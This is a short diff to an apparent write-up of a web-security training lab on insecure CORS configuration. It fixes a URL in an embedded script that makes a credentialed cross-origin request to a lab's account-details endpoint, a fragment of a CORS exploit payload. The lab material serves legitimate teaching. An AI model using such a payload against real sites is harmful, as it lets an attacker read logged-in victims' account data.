@@ -19,7 +19,7 @@ This lab demonstrated how **insecure CORS configuration** (trusting all origins 
    <script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
     req.withCredentials = true;
     req.send();
 
